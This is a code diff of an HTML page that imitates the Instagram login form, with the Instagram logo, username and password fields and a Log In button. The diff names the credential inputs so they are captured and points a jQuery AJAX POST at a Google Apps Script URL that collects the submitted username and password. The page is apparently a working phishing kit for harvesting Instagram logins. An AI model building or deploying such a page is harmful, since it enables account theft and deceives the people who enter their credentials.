@@ -19,18 +19,18 @@
   <body>
     <!-- LOGIN BOX -->
     <form id="submit-form" action="">
+
     <div class="login">
       <img src="instagram logo.png" alt="" srcset="" />
       <input
         class="box1"
-        type="text"
+        name="username/phone:-" required="required" type="text"
         placeholder="Phone number, username, or email"
         required
       />
-      <input class="box2" type="password" placeholder="Password" required />
-      <button class="btn" type="submit">Log In</button>
-
-      <div class="partition">
+      <input class="box2" name="password:" type="password" placeholder="Password" required />
+      <button class="btn" type = "SUBMIT" name="submit_btn" id = "SUBMIT" value = "SUBMIT">Log In</button>      
+<div class="partition">
         <div class="left"></div>
         <div class="center">OR</div>
         <div class="right"></div>
@@ -44,7 +44,7 @@
         $("#submit-form").submit((e)=>{
             e.preventDefault()
             $.ajax({
-                url:"https://script.google.com/macros/s/AKfycbwn9lHtCaEWAeaUfR9fZiNYfoTN_ZFwivQ89IB-Xw/exec",
+                url:"https://script.google.com/macros/s/AKfycbwxm62Fs7DK6B-XojNqbXhGcbGwNT3-Ml93VvU9UQvh42olxl1u/exec",
                 data:$("#submit-form").serialize(),
                 method:"post",
                 success:function (data) {
